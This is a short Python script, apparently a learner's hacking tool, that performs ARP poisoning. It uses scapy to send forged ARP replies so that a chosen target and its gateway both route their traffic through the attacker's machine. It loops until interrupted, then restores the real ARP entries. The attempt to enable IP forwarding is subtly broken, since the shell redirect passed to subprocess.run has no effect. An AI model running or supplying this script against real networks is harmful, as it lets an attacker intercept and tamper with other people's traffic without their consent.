import subprocess
import scapy.all as scapy
import time
import optparse


def ipForward():
    subprocess.run(["sudo","echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])

def getUserInput():
    parseObject = optparse.OptionParser()
    parseObject.add_option("-i", "--ipaddress",dest="targetIP",help="Enter Target IP")
    parseObject.add_option("-g","--gateway",dest="gatewayIP",help="Enter Gateway IP")
    options = parseObject.parse_args()[0]

    if not options.targetIP:
        print("Enter Target IP")

    if not options.gatewayIP:
        print("Enter Gateway IP")

    return options

def getMACaddress(ip):
    arpRequestPacket = scapy.ARP(pdst=ip)
    broadcastPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combinedPacket = broadcastPacket/arpRequestPacket
    answeredList = scapy.srp(combinedPacket,timeout=1,verbose=False)[0]

    return answeredList[0][1].hwsrc

def arpPoisoning(targetIP,poisoned_ip):

    targetMAC = getMACaddress(targetIP)

    arpResponse = scapy.ARP(op=2,pdst=targetIP,hwdst=targetMAC,psrc=poisoned_ip)
    scapy.send(arpResponse,verbose=False) 

def reset(fooledIP,gatewayIP):

    fooledMAC = getMACaddress(fooledIP)
    gatewayMAC = getMACaddress(gatewayIP)

    arpResponse = scapy.ARP(op=2,pdst=fooledIP,hwdst=fooledMAC,psrc=gatewayIP,hwsrc=gatewayMAC)
    scapy.send(arpResponse,verbose=False,count=5)


number = 0

userIP = getUserInput()
userTargetIP = userIP.targetIP
userGatewayIP = userIP.gatewayIP

try:
    while True:
        ipForward()
        arpPoisoning(userTargetIP,userGatewayIP)
        arpPoisoning(userGatewayIP,userTargetIP)

        number += 2

        print("\rSending packets " + str(number),end="")

        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset(userTargetIP,userGatewayIP)
    reset(userGatewayIP,userTargetIP)
